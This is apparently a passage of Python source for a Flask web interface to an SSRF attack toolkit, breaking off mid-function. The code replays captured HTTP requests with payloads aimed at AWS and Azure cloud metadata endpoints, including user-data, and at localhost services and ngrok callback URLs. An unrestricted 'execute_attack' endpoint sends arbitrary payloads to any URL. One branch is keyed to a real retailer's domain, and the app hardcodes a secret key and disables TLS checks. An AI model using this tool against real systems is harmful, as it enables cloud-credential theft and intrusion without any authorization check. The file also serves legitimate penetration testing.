"""
Microservice SSRF Pentest Toolkit - Web UI
Flask-based web interface for the pentest toolkit
"""

from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
import sys
import os
import json
import threading
import time
import requests
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import urllib3

# Suppress SSL warnings for target validation
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from core.config import ToolkitConfig, BlackBoxConfig, GrayBoxConfig, WhiteBoxConfig
from core.logger import get_logger, init_logger
from core.database import FindingDatabase, Finding

from blackbox.reconnaissance.endpoint_discovery_v2 import EndpointDiscoveryV2
from blackbox.reconnaissance.parameter_fuzzer import ParameterFuzzer
from blackbox.reconnaissance.auto_discovery import AutoDiscovery
from blackbox.detection.external_callback import CallbackServer, ExternalCallbackDetector
from blackbox.exploitation.internal_scan import InternalScanner
from graybox.architecture.docker_inspector import DockerInspector
from whitebox.static_analysis.code_scanner import CodeScanner

app = Flask(__name__)
app.config['SECRET_KEY'] = 'ssrf-pentest-toolkit-secret-key'
socketio = SocketIO(app, cors_allowed_origins="*")

# Thread safety lock
scan_state_lock = threading.RLock()  # Reentrant lock for nested access

# Global state
scan_state = {
    'is_running': False,
    'current_phase': None,
    'progress': 0,
    'findings': [],
    'endpoints': [],
    'logs': [],
    'start_time': None,
    'callback_server': None
}

# Global callback server (singleton to avoid port conflicts)
global_callback_server = None
callback_server_lock = threading.Lock()

# Thread-safe state accessors
def get_scan_running():
    """Thread-safe check if scan is running"""
    with scan_state_lock:
        return scan_state['is_running']

def set_scan_running(running: bool):
    """Thread-safe set scan running status"""
    with scan_state_lock:
        scan_state['is_running'] = running

def add_finding(finding: dict):
    """Thread-safe add finding and emit to UI"""
    with scan_state_lock:
        scan_state['findings'].append(finding)
    
    # Emit to UI via SocketIO
    try:
        socketio.emit('finding', {
            'severity': finding.get('severity', 'MEDIUM'),
            'message': finding.get('description') or finding.get('title', 'Vulnerability found'),
            'category': finding.get('category', 'Unknown'),
            'affected_url': finding.get('affected_url', ''),
            'timestamp': finding.get('timestamp', datetime.now().isoformat())
        })
    except Exception as e:
        pass  # Non-fatal: finding still saved to state

def add_endpoint(endpoint: dict):
    """Thread-safe add endpoint"""
    with scan_state_lock:
        scan_state['endpoints'].append(endpoint)

def add_log(log_entry: dict):
    """Thread-safe add log"""
    with scan_state_lock:
        scan_state['logs'].append(log_entry)

def reset_scan_state():
    """Thread-safe reset scan state"""
    with scan_state_lock:
        scan_state['is_running'] = False
        scan_state['current_phase'] = None
        scan_state['progress'] = 0
        scan_state['findings'] = []
        scan_state['endpoints'] = []
        scan_state['logs'] = []
        scan_state['start_time'] = None
        scan_state['callback_server'] = None
    
    # Cleanup global callback server on hard reset
    cleanup_callback_server()

def get_scan_state_value(key: str, default=None):
    """Thread-safe get scan state value"""
    with scan_state_lock:
        return scan_state.get(key, default)

def set_callback_server(server):
    """Thread-safe set callback server"""
    with scan_state_lock:
        scan_state['callback_server'] = server

def get_or_create_callback_server(port: int = 8888):
    """
    Get or create a singleton callback server to avoid port conflicts.
    This ensures only one server runs on a given port at a time.
    """
    global global_callback_server
    
    with callback_server_lock:
        # Check if server exists and is running
        if global_callback_server is not None:
            try:
                # Test if server is still alive
                if hasattr(global_callback_server, 'is_running') and global_callback_server.is_running:
                    web_logger.info(f"♻️ Reusing existing callback server on port {port}")
                    return global_callback_server
                else:
                    # Server exists but not running - clean up
                    web_logger.info(f"🧹 Cleaning up stale callback server")
                    try:
                        global_callback_server.stop()
                    except:
                        pass
                    global_callback_server = None
            except:
                # Server object is corrupted - clean up
                global_callback_server = None
        
        # Create new server
        try:
            web_logger.info(f"🆕 Creating new callback server on port {port}")
            server = CallbackServer(host='0.0.0.0', port=port)
            server.start()
            global_callback_server = server
            return server
        except OSError as e:
            if "Address already in use" in str(e):
                web_logger.error(f"❌ Port {port} is already in use!")
                web_logger.error(f"💡 Try: 1) Wait 30s for old server to timeout, or 2) Use different port")
                raise Exception(f"Callback server port {port} is busy. Please wait or use another port.")
            raise

def cleanup_callback_server():
    """Thread-safe cleanup of global callback server"""
    global global_callback_server
    
    with callback_server_lock:
        if global_callback_server is not None:
            try:
                web_logger.info("🛑 Stopping callback server...")
                global_callback_server.stop()
            except Exception as e:
                web_logger.warning(f"⚠️ Error stopping callback server: {e}")
            finally:
                global_callback_server = None

def detect_public_callback_url():
    """
    Auto-detect public callback URL from ngrok or other tunneling services.
    Returns: (url, source) tuple or (None, None) if not detected
    """
    # Strategy 1: Try ngrok API (most reliable)
    try:
        ngrok_response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2)
        if ngrok_response.status_code == 200:
            tunnels = ngrok_response.json().get('tunnels', [])
            for tunnel in tunnels:
                # Prefer HTTPS tunnel
                if tunnel.get('proto') == 'https':
                    url = tunnel['public_url'].rstrip('/')
                    return (url, 'ngrok')
            # Fallback to HTTP if no HTTPS
            for tunnel in tunnels:
                if tunnel.get('proto') == 'http':
                    url = tunnel['public_url'].rstrip('/')
                    return (url, 'ngrok')
    except Exception:
        pass
    
    # Strategy 2: Check for other tunneling services (future)
    # Could add support for localtunnel, expose.dev, etc.
    
    return (None, None)

class WebUILogger:
    """Custom logger that emits to web UI"""
    def __init__(self):
        self.logger = get_logger(__name__)
    
    def info(self, message):
        self.logger.info(message)
        self._emit_log('info', message)
    
    def warning(self, message):
        self.logger.warning(message)
        self._emit_log('warning', message)
    
    def error(self, message):
        self.logger.error(message)
        self._emit_log('error', message)
    
    def finding(self, severity, message):
        self.logger.info(f"[{severity}] {message}")
        self._emit_log('finding', message, severity)
        add_finding({
            'severity': severity,
            'message': message,
            'timestamp': datetime.now().isoformat()
        })
    
    def endpoint(self, endpoint_data):
        """Emit discovered endpoint to UI"""
        socketio.emit('endpoint', endpoint_data)
        add_endpoint(endpoint_data)
    
    def _emit_log(self, level, message, severity=None):
        log_entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'level': level,
            'message': message,
            'severity': severity
        }
        add_log(log_entry)
        socketio.emit('log', log_entry)

# Initialize logger
web_logger = WebUILogger()

@app.route('/')
def index():
    """Main dashboard"""
    return render_template('index.html')

@app.route('/api/scan/start', methods=['POST'])
def start_scan():
    """Start a new scan"""
    # Debug logging
    web_logger.info(f"=== Scan Request Debug ===")
    web_logger.info(f"Content-Type: {request.content_type}")
    web_logger.info(f"Form data: {dict(request.form)}")
    web_logger.info(f"Files: {list(request.files.keys())}")
    web_logger.info(f"=======================")
    
    if get_scan_running():
        return jsonify({'error': 'Scan already in progress'}), 400
    
    # Check if traffic capture file is provided (HAR or Burp Suite)
    har_file = request.files.get('har_file')
    har_data = None
    
    if har_file:
        # Traffic capture file provided - auto-detect format and parse
        try:
            file_content = har_file.read().decode('utf-8')
            filename = har_file.filename.lower()
            
            # Auto-detect format
            parser = None
            source_type = "Unknown"
            
            # Try HAR format first (Chrome DevTools)
            if filename.endswith('.har') or '"log"' in file_content[:200]:
                from utils.har_parser import parse_har_content
                parser = parse_har_content(file_content)
                source_type = "Chrome DevTools HAR"
            
            # Try Burp Suite format (JSON/XML)
            elif filename.endswith('.json') or filename.endswith('.xml') or 'base64' in file_content[:500]:
                from utils.burp_parser import parse_burp_content
                parser = parse_burp_content(file_content, format_type='auto')
                source_type = "Burp Suite Proxy History"
            
            # Fallback: Try both formats
            else:
                try:
                    from utils.har_parser import parse_har_content
                    parser = parse_har_content(file_content)
                    source_type = "HAR"
                except:
                    from utils.burp_parser import parse_burp_content
                    parser = parse_burp_content(file_content, format_type='auto')
                    source_type = "Burp Suite"
            
            if parser:
                har_data = {
                    'requests': parser.requests,
                    'endpoints': parser.get_endpoints(),
                    'stats': parser.get_stats(),
                    'source': source_type
                }
                
                web_logger.info(f"📁 {source_type} file uploaded: {har_file.filename}")
                web_logger.info(f"📊 Parsed {har_data['stats']['total_requests']} requests, {har_data['stats']['unique_endpoints']} unique endpoints")
                
                # Log authenticated requests
                auth_count = har_data['stats']['authenticated_requests']
                if auth_count > 0:
                    web_logger.info(f"🔐 Found {auth_count} authenticated requests (with JWT/cookies)")
                
                # Extract target URL from parsed requests
                if har_data['requests']:
                    first_request = har_data['requests'][0]
                    parsed_url = urlparse(first_request['url'])
                    extracted_target = f"{parsed_url.scheme}://{parsed_url.netloc}"
                    web_logger.info(f"🎯 Extracted target from Burp file: {extracted_target}")
                else:
                    extracted_target = None
            else:
                return jsonify({'error': 'Unable to detect file format (expected HAR or Burp Suite export)'}), 400
            
        except Exception as e:
            import traceback
            error_detail = traceback.format_exc()
            web_logger.error(f"Parse error: {error_detail}")
            return jsonify({'error': f'Failed to parse file: {str(e)}'}), 400
    
    # Get form data (either from multipart or JSON)
    # Always try form data first (since we're using FormData in frontend)
    if request.form:
        # Multipart form data or form-encoded
        mode = request.form.get('mode', 'blackbox')
        target = request.form.get('target')
        source_path = request.form.get('source_path', '')
        auto_discovery = request.form.get('auto_discovery') == 'on'
        endpoint_discovery = request.form.get('endpoint_discovery') == 'on'
        parameter_fuzzing = request.form.get('parameter_fuzzing') == 'on'
        callback_testing = request.form.get('callback_testing') == 'on'
        internal_scanning = request.form.get('internal_scanning') == 'on'
        docker_inspection = request.form.get('docker_inspection') == 'on'
        code_scanning = request.form.get('code_scanning') == 'on'
        timeout = int(request.form.get('timeout', 10))
        endpoint_source = request.form.get('endpoint_source', 'file')  # 'file', 'url', or 'both'
        
        # Burp import specific fields
        if not target:
            target = request.form.get('burp_target')
        
        # Use extracted target from file if no manual target provided
        if not target and 'extracted_target' in locals():
            target = extracted_target
            web_logger.info(f"🎯 Using extracted target: {target}")
            
        if request.form.get('burp_parameter_fuzzing') == 'on':
            parameter_fuzzing = True
        if request.form.get('burp_callback_testing') == 'on':
            callback_testing = True
        if request.form.get('burp_internal_scanning') == 'on':
            internal_scanning = True
        if request.form.get('burp_timeout'):
            timeout = int(request.form.get('burp_timeout', 10))
        
        # Get custom selections
        custom_params = request.form.get('custom_params')
        custom_payloads = request.form.get('custom_payloads')
        custom_endpoints = request.form.get('custom_endpoints')
        
        if custom_params:
            custom_params = json.loads(custom_params)
        if custom_payloads:
            custom_payloads = json.loads(custom_payloads)
        if custom_endpoints:
            custom_endpoints = json.loads(custom_endpoints)
    elif request.json:
        # JSON data (fallback)
        data = request.json
        mode = data.get('mode', 'blackbox')
        target = data.get('target')
        source_path = data.get('source_path', '')
        auto_discovery = data.get('auto_discovery', False)
        endpoint_discovery = data.get('endpoint_discovery', True)
        parameter_fuzzing = data.get('parameter_fuzzing', True)
        callback_testing = data.get('callback_testing', True)
        internal_scanning = data.get('internal_scanning', True)
        docker_inspection = data.get('docker_inspection', True)
        code_scanning = data.get('code_scanning', True)
        timeout = data.get('timeout', 10)
        endpoint_source = data.get('endpoint_source', 'file')  # 'file', 'url', or 'both'
        
        # Get custom selections
        custom_params = data.get('custom_params')
        custom_payloads = data.get('custom_payloads')
        custom_endpoints = data.get('custom_endpoints')
    else:
        return jsonify({'error': 'No form data or JSON data received. Please check your request.'}), 400
    
    # Validate input
    if not target and mode != 'whitebox' and not har_data:
        web_logger.error(f"Validation failed: target={target}, mode={mode}, har_data={har_data}")
        return jsonify({'error': 'Please provide a target URL or upload a HAR/Burp file to begin scanning.'}), 400
    
    # Validate target URL format and accessibility (if provided)
    if target and mode != 'whitebox':
        # Check URL format
        try:
            parsed = urlparse(target)
            if not parsed.scheme or not parsed.netloc:
                return jsonify({
                    'error': f'Invalid URL format. The URL must include http:// or https:// at the beginning.',
                    'example': 'Example: http://example.com or https://example.com:8080/path'
                }), 400
            
            if parsed.scheme not in ['http', 'https']:
                return jsonify({
                    'error': f'Invalid URL scheme "{parsed.scheme}". Only http:// and https:// are supported.',
                    'example': f'Try: http://{parsed.netloc}{parsed.path or "/"}'
                }), 400
        except Exception as e:
            return jsonify({'error': f'Invalid URL format: {str(e)}'}), 400
        
        # Try to connect to target (timeout 5s)
        # Don't log technical details - frontend will show user-friendly messages
        try:
            response = requests.get(target, timeout=5, allow_redirects=True, verify=False)
            # Target is accessible, no need to log success
        except requests.exceptions.ConnectionError as e:
            error_detail = str(e).lower()
            if 'nodename nor servname provided' in error_detail or 'name or service not known' in error_detail or 'no such host' in error_detail:
                return jsonify({
                    'error': f'Cannot connect to target: The domain "{parsed.netloc}" does not exist or cannot be found.'
                }), 400
            else:
                return jsonify({
                    'error': f'Cannot connect to target: {target}. The server might be offline or unreachable.'
                }), 400
        except requests.exceptions.Timeout:
            return jsonify({
                'error': f'Connection timeout: {target} is not responding. The server might be slow or offline.'
            }), 400
        except requests.exceptions.SSLError as e:
            # SSL errors are warnings, allow scan to continue
            pass
        except requests.exceptions.TooManyRedirects:
            return jsonify({
                'error': f'Too many redirects when connecting to {target}. The server configuration might be incorrect.'
            }), 400
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            return jsonify({
                'error': f'Failed to connect to target: {error_msg}'
            }), 400
    
    # Reset state (thread-safe)
    with scan_state_lock:
        scan_state['is_running'] = True
        scan_state['current_phase'] = 'Initializing'
        scan_state['progress'] = 0
        scan_state['findings'] = []
        scan_state['endpoints'] = []
        scan_state['logs'] = []
        scan_state['start_time'] = datetime.now()
        scan_state['har_data'] = har_data  # Store HAR data for use in scan
        scan_state['endpoint_source'] = endpoint_source  # Store endpoint source preference
        scan_state['custom_params'] = custom_params  # Store custom param selection
        scan_state['custom_payloads'] = custom_payloads  # Store custom payload selection
        scan_state['custom_endpoints'] = custom_endpoints  # Store custom endpoint selection
    
    # Log custom selections
    if custom_params:
        web_logger.info(f"⚙️ Custom parameters selected: {len(custom_params)} params")
    if custom_payloads:
        web_logger.info(f"💉 Custom payloads selected: {len(custom_payloads)} payloads")
    if custom_endpoints:
        web_logger.info(f"📍 Custom endpoints selected: {len(custom_endpoints)} endpoints")
    
    # Create config
    config = ToolkitConfig(
        mode=mode,
        output_dir='reports',
        blackbox=BlackBoxConfig(
            target_url=target or "http://localhost:8083",
            auto_discovery=auto_discovery,
            endpoint_discovery=endpoint_discovery,
            parameter_fuzzing=parameter_fuzzing,
            external_callback_test=callback_testing,
            internal_scan=internal_scanning,
            timeout=timeout
        ),
        graybox=GrayBoxConfig(
            target_url=target or "http://localhost:8083",
            docker_inspect=docker_inspection
        ),
        whitebox=WhiteBoxConfig(
            source_code_path=source_path or "./",
            code_scan=code_scanning
        )
    )
    
    # Start scan in background thread
    thread = threading.Thread(target=run_scan, args=(config,))
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'message': 'Scan started'})

@app.route('/api/scan/stop', methods=['POST'])
def stop_scan():
    """Stop current scan"""
    if not get_scan_running():
        return jsonify({'error': 'No scan running'}), 400
    
    with scan_state_lock:
        scan_state['is_running'] = False
        
        # Clear callback server reference but don't stop it
        # Let it run for potential reuse
        scan_state['callback_server'] = None
    
    web_logger.info('🛑 Scan stopped by user (callback server kept alive)')
    return jsonify({'success': True, 'message': 'Scan stopped'})

@app.route('/api/scan/reset', methods=['POST'])
def reset_scan_endpoint():
    """Reset scan state (force unlock)"""
    reset_scan_state()
    web_logger.info('🔄 Scan state reset and callback server stopped')
    return jsonify({'success': True, 'message': 'Scan state reset'})

@app.route('/api/scan/status', methods=['GET'])
def scan_status():
    """Get current scan status"""
    with scan_state_lock:
        return jsonify({
            'is_running': scan_state['is_running'],
            'current_phase': scan_state['current_phase'],
            'progress': scan_state['progress'],
            'findings_count': len(scan_state['findings']),
            'start_time': scan_state['start_time'].isoformat() if scan_state['start_time'] else None
        })

@app.route('/api/findings', methods=['GET'])
def get_findings():
    """Get all findings"""
    with scan_state_lock:
        return jsonify(list(scan_state['findings']))  # Return copy to avoid race conditions

@app.route('/api/logs', methods=['GET'])
def get_logs():
    """Get all logs"""
    with scan_state_lock:
        return jsonify(list(scan_state['logs']))  # Return copy to avoid race conditions

@app.route('/api/report/export', methods=['POST'])
def export_report():
    """Export report"""
    format_type = request.json.get('format', 'json')
    
    if format_type == 'json':
        report_file = Path('reports') / f'report_{int(time.time())}.json'
        report_file.parent.mkdir(exist_ok=True)
        
        with scan_state_lock:
            report_data = {
                'findings': list(scan_state['findings']),
                'logs': list(scan_state['logs']),
                'start_time': scan_state['start_time'].isoformat() if scan_state['start_time'] else None,
                'generated_at': datetime.now().isoformat()
            }
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        return jsonify({
            'success': True,
            'file': str(report_file)
        })
    
    return jsonify({'success': False, 'error': 'Invalid format'}), 400

@app.route('/api/execute_attack', methods=['POST'])
def execute_attack():
    """Execute attack POC for demonstration purposes"""
    try:
        data = request.json
        url = data.get('url')
        method = data.get('method', 'GET')
        parameter = data.get('parameter')
        payload = data.get('payload')
        
        if not url or not parameter or not payload:
            return jsonify({
                'success': False,
                'error': 'Missing required parameters'
            }), 400
        
        # Execute the attack request
        if method.upper() == 'GET':
            # For GET, replace parameter in URL
            from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [payload]
            new_query = urlencode(params, doseq=True)
            attack_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            response = requests.get(attack_url, timeout=10, verify=False)
        else:
            # For POST/PUT/PATCH, send JSON body
            json_body = {parameter: payload}
            response = requests.request(
                method.upper(),
                url,
                json=json_body,
                timeout=10,
                verify=False
            )
        
        # Return response
        return jsonify({
            'success': True,
            'status_code': response.status_code,
            'response_body': response.text[:2000],  # Limit to 2000 chars
            'headers': dict(response.headers)
        })
        
    except requests.exceptions.Timeout:
        return jsonify({
            'success': False,
            'error': 'Request timed out'
        }), 408
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

def run_scan(config: ToolkitConfig):
    """Run the actual scan (background task)"""
    try:
        web_logger.info("🔧 Initializing scan...")
        db = FindingDatabase()
        
        if config.mode in ['blackbox', 'all']:
            run_blackbox(config, db)
        
        if config.mode in ['graybox', 'all']:
            run_graybox(config, db)
        
        if config.mode in ['whitebox', 'all']:
            run_whitebox(config, db)
        
        # Final phase
        update_progress('Scan Complete', 100)
        # Notify frontend that scan is complete so UI can stop timers and finalize state
        try:
            socketio.emit('scan_complete', {
                'message': 'Scan completed successfully',
                'findings': len(scan_state.get('findings', []))
            }, broadcast=True)
        except Exception:
            pass
        web_logger.info(f"✅ Scan completed successfully! Found {len(scan_state['findings'])} findings")
        
    except Exception as e:
        import traceback
        error_detail = traceback.format_exc()
        web_logger.error(f"❌ Scan failed: {str(e)}")
        web_logger.error(f"Details: {error_detail}")
        update_progress('Scan Failed', scan_state.get('progress', 0))
        # Notify frontend about the error so UI can stop timers and show error state
        try:
            socketio.emit('scan_error', {
                'message': str(e),
                'details': error_detail
            }, broadcast=True)
        except Exception:
            pass
    finally:
        # Always reset state when scan ends (thread-safe)
        with scan_state_lock:
            scan_state['is_running'] = False
            # Clear callback server reference but keep it running for reuse
            scan_state['callback_server'] = None
        web_logger.info("🏁 Scan process terminated (callback server kept alive)")

def run_focused_ssrf_testing(config: ToolkitConfig, db: FindingDatabase, har_data: dict):
    """Run focused SSRF testing on specific requests from Burp Suite/HAR file"""
    web_logger.info("🎯 Starting Focused SSRF Testing on specific endpoints")
    
    # Initialize callback server for SSRF testing
    callback_server = get_or_create_callback_server(port=8888)
    set_callback_server(callback_server)
    web_logger.info(f"📡 Callback server ready on http://0.0.0.0:8888")
    
    callback_addresses = callback_server.get_all_callback_addresses()
    formatted_addresses = [f"{addr}:8888" for addr in callback_addresses]
    web_logger.info(f"🌐 Callback addresses: {', '.join(formatted_addresses)}")

    # Auto-detect public callback URL (ngrok or configured)
    public_callback_base = None
    callback_source = None
    
    # Try auto-detection first
    public_callback_base, callback_source = detect_public_callback_url()
    
    if public_callback_base:
        web_logger.info(f"✅ Auto-detected {callback_source} tunnel: {public_callback_base}")
    else:
        # Fallback to configured callback server
        try:
            if config and getattr(config, 'blackbox', None) and config.blackbox.callback_server:
                public_callback_base = config.blackbox.callback_server.rstrip('/')
                callback_source = 'config'
                web_logger.info(f"🔗 Using configured callback server: {public_callback_base}")
        except Exception:
            pass
    
    # Add to callback_addresses for compatibility
    if public_callback_base:
        try:
            import urllib.parse as _up
            parsed = _up.urlparse(public_callback_base)
            host_only = parsed.netloc or parsed.path
            if host_only and host_only not in callback_addresses:
                callback_addresses.insert(0, host_only)
        except Exception:
            pass
    
    if not public_callback_base:
        web_logger.info(f"⚠️ No public callback detected. Using local addresses (may not work for remote targets).")
    
    # Test callback server connectivity
    web_logger.info("🧪 Testing callback server connectivity...")
    try:
        import requests as req
        test_response = req.get(f"http://127.0.0.1:8888/test", timeout=2)
        web_logger.info(f"✅ Callback server responding: {test_response.status_code}")
    except Exception as e:
        web_logger.info(f"❌ Callback server test failed: {e}")
    
    update_progress('Analyzing Burp Suite requests', 10)
    
    # Process each request from the file
    requests_analyzed = 0
    ssrf_findings = []
    
    for request in har_data.get('requests', []):
        try:
            requests_analyzed += 1
            url = request.get('url', '')
            method = request.get('method', 'GET')
            headers = request.get('headers', {})
            post_data = request.get('post_data', {})
            
            web_logger.info(f"🔍 Analyzing request {requests_analyzed}: {method} {url}")
            
            # Debug: Show full request data
            web_logger.info(f"  🔧 Request headers: {list(headers.keys())}")
            web_logger.info(f"  🔧 POST data type: {type(post_data)}")
            web_logger.info(f"  🔧 POST data: {post_data}")
            
            # Focus on POST/PUT requests with JSON body (most likely to have SSRF parameters)
            if method in ['POST', 'PUT', 'PATCH'] and post_data:
                # Try to parse JSON body
                try:
                    import json
                    body_data = None
                    
                    if isinstance(post_data, str):
                        body_data = json.loads(post_data)
                    elif isinstance(post_data, dict):
                        # If already a dict, use it directly
                        body_data = post_data
                    else:
                        web_logger.info(f"  ❌ Unsupported POST data type: {type(post_data)}")
                        continue
                    
                    web_logger.info(f"  🔧 Parsed JSON body: {body_data}")
                        
                    # Look for URL parameters in the body
                    url_params = []
                    for key, value in body_data.items():
                        if isinstance(value, str) and ('http' in value.lower() or 'url' in key.lower()):
                            url_params.append((key, value))
                            web_logger.info(f"  📍 Found potential URL parameter: {key} = {value}")
                    
                    if not url_params:
                        web_logger.info(f"  ❌ No URL parameters found in request body")
                        continue
                    
                    # Test each URL parameter for SSRF
                    if url_params:
                        for param_name, original_value in url_params:
                            web_logger.info(f"  🧪 Testing SSRF on parameter: {param_name}")
                            
                            # Test with multiple SSRF strategies
                            ssrf_payloads = []
                            
                            # Strategy 1: AWS Cloud metadata (CRITICAL)
                            ssrf_payloads.append({
                                'name': 'AWS Metadata',
                                'url': 'http://169.254.169.254/latest/meta-data/',
                                'path_check': '/latest/meta-data/',
                                'critical': True,
                                'evidence_keywords': ['ami-id', 'instance-id', 'instance-type', 'security-groups']
                            })
                            
                            ssrf_payloads.append({
                                'name': 'AWS User Data',
                                'url': 'http://169.254.169.254/latest/user-data/',
                                'path_check': '/latest/user-data/',
                                'critical': True,
                                'evidence_keywords': ['#!/bin/bash', 'user-data', 'cloud-init']
                            })
                            
                            # Strategy 2: Azure metadata
                            ssrf_payloads.append({
                                'name': 'Azure Metadata',
                                'url': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                                'path_check': '/metadata/instance',
                                'critical': True,
                                'evidence_keywords': ['compute', 'network', 'vmId', 'subscriptionId']
                            })
                            
                            # Strategy 3: Direct callback URLs
                            # Prefer a configured public callback base (ngrok/webhook.site) when available
                            if public_callback_base:
                                ssrf_payloads.append({
                                    'name': 'Direct Callback (public)',
                                    'url': f"{public_callback_base}/ssrf_test_{requests_analyzed}_{param_name}",
                                    'path_check': f"/ssrf_test_{requests_analyzed}_{param_name}",
                                    'critical': False,
                                    'evidence_keywords': []
                                })
                            else:
                                for callback_addr in callback_addresses[:2]:
                                    ssrf_payloads.append({
                                        'name': 'Direct Callback',
                                        'url': f"http://{callback_addr}:8888/ssrf_test_{requests_analyzed}_{param_name}",
                                        'path_check': f"/ssrf_test_{requests_analyzed}_{param_name}",
                                        'critical': False,
                                        'evidence_keywords': []
                                    })
                            
                            # Strategy 4: Localhost services
                            ssrf_payloads.append({
                                'name': 'Localhost HTTP',
                                'url': 'http://127.0.0.1:8080',
                                'path_check': None,
                                'critical': False,
                                'evidence_keywords': ['server', 'apache', 'nginx', 'tomcat']
                            })
                            
                            # Strategy 5: Subdomain takeover attempt (mimic legitimate domain)
                            if 'lazada.vn' in original_value.lower():
                                if public_callback_base:
                                    ssrf_payloads.append({
                                        'name': 'Subdomain Mimic (public)',
                                        'url': f"{public_callback_base}/products/api/price/check",
                                        'path_check': f"/products/api/price/check",
                                        'critical': False,
                                        'evidence_keywords': []
                                    })
                                else:
                                    for callback_addr in callback_addresses[:1]:
                                        ssrf_payloads.append({
                                            'name': 'Subdomain Mimic',
                                            'url': f"http://api.{callback_addr}:8888/products/api/price/check",
                                            'path_check': f"/products/api/price/check",
                                            'critical': False,
                                            'evidence_keywords': []
                                        })
                            
                            # Test each payload
                            ssrf_confirmed_for_param = False  # Track if we found SSRF for this param
                            for payload_info in ssrf_payloads:
                                # Skip remaining tests if we already confirmed SSRF for this parameter
                                if ssrf_confirmed_for_param:
                                    break
                                    
                                test_url = payload_info['url']
                                test_name = payload_info['name']
                                path_check = payload_info['path_check']
                                is_critical = payload_info.get('critical', False)
                                evidence_keywords = payload_info.get('evidence_keywords', [])
                                
                                # Prepare modified body
                                modified_body = body_data.copy()
                                modified_body[param_name] = test_url
                                
                                # Send SSRF test request
                                try:
                                    import requests as req
                                    web_logger.info(f"    💉 Testing [{test_name}]: {test_url}")
                                    
                                    # Send the request with SSRF payload
                                    response = req.request(
                                        method=method,
                                        url=url,
                                        json=modified_body,
                                        headers=headers,
                                        timeout=config.blackbox.timeout,
                                        verify=False,
                                        allow_redirects=True
                                    )
                                    
                                    web_logger.info(f"    📈 Response: {response.status_code}")
                                    
                                    # Analyze response for SSRF evidence
                                    ssrf_confirmed = False
                                    evidence_found = []
                                    
                                    # Check response content for evidence
                                    if response.status_code == 200:
                                        response_text = response.text.lower()
                                        
                                        # Look for evidence keywords in response
                                        for keyword in evidence_keywords:
                                            if keyword.lower() in response_text:
                                                evidence_found.append(keyword)
                                        
                                        # If we found evidence keywords, this is confirmed SSRF
                                        if evidence_found:
                                            ssrf_confirmed = True
                                            web_logger.info(f"    🔥 EVIDENCE FOUND: {', '.join(evidence_found)}")
                                        
                                        # Check for JSON response with compare_url echo
                                        try:
                                            response_json = response.json()
                                            if 'compare_url' in response_json and test_url in str(response_json['compare_url']):
                                                web_logger.info(f"    ✅ Server processed our payload: {response_json.get('compare_url', '')}")
                                                
                                                # Check content_preview for SSRF evidence
                                                content_preview = response_json.get('content_preview', '')
                                                if content_preview and any(kw.lower() in content_preview.lower() for kw in evidence_keywords):
                                                    ssrf_confirmed = True
                                                    web_logger.info(f"    � SSRF CONFIRMED! Content preview contains: {content_preview[:200]}...")
                                        except:
                                            pass
                                    
                                    # Also check for callback if path_check is provided
                                    if path_check and not ssrf_confirmed:
                                        import time
                                        time.sleep(1)  # Wait for callback
                                        
                                        if callback_server.check_callback_received(path_check, timeout=3):
                                            ssrf_confirmed = True
                                            web_logger.info(f"    ✅ Callback received for {test_name}")
                                    
                                    # If SSRF confirmed, create finding
                                    if ssrf_confirmed:
                                        severity = 'CRITICAL' if is_critical else 'HIGH'
                                        finding_msg = f"🔥 {severity} SSRF: {method} {url} (parameter: {param_name})"
                                        # Log to console only (don't emit duplicate via web_logger.finding)
                                        web_logger.info(finding_msg)
                                        web_logger.info(f"    ✅ SSRF confirmed with {test_name} strategy!")
                                        web_logger.info(f"    💥 Original value: {original_value}")
                                        web_logger.info(f"    💥 SSRF payload: {test_url}")
                                        
                                        if evidence_found:
                                            web_logger.info(f"    🎯 Evidence: {', '.join(evidence_found)}")
                                        
                                        ssrf_findings.append({
                                            'endpoint': url,
                                            'method': method,
                                            'parameter': param_name,
                                            'original_value': original_value,
                                            'ssrf_payload': test_url,
                                            'strategy': test_name,
                                            'evidence': evidence_found,
                                            'is_critical': is_critical,
                                            'callback_received': path_check and callback_server.check_callback_received(path_check, timeout=1),
                                            'status_code': response.status_code,
                                            'response_preview': response.text[:500] if response.status_code == 200 else ''
                                        })
                                        
                                        # Save to database — map to Finding dataclass schema
                                        try:
                                            # Build request/response strings for evidence
                                            request_str = f"{method} {url}\n"
                                            for h_name, h_val in headers.items():
                                                request_str += f"{h_name}: {h_val}\n"
                                            request_str += f"\nBody: {json.dumps(modified_body)}"
                                            
                                            response_str = f"HTTP {response.status_code}\n"
                                            response_str += f"Content preview:\n{response.text[:500]}"
                                            
                                            evidence_keywords_str = ', '.join(evidence_found) if evidence_found else 'N/A'
                                            
                                            finding = Finding(
                                                id=None,  # Auto-generate in DB
                                                timestamp=datetime.now().isoformat(),
                                                mode='blackbox',
                                                severity=severity,
                                                category='SSRF',
                                                title=f"SSRF via {test_name} in {param_name}",
                                                description=f"Server-Side Request Forgery detected in parameter '{param_name}' using {test_name} strategy. Original value: {original_value}. Payload: {test_url}. Evidence keywords: {evidence_keywords_str}",
                                                affected_url=url,
                                                request=request_str,
                                                response=response_str,
                                                proof_of_concept=f"POST {url}\nParameter: {param_name}\nPayload: {test_url}\nEvidence: {evidence_keywords_str}",
                                                remediation="Implement strict allowlist for outbound requests. Validate and sanitize all user-supplied URLs. Use network segmentation to prevent access to internal/cloud metadata endpoints.",
                                                cvss_score=9.1 if is_critical else 8.2,
                                                cwe_id='CWE-918',
                                                references=['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://portswigger.net/web-security/ssrf']
                                            )
                                            db.add_finding(finding)
                                            web_logger.info(f"    💾 Finding saved to database")
                                            
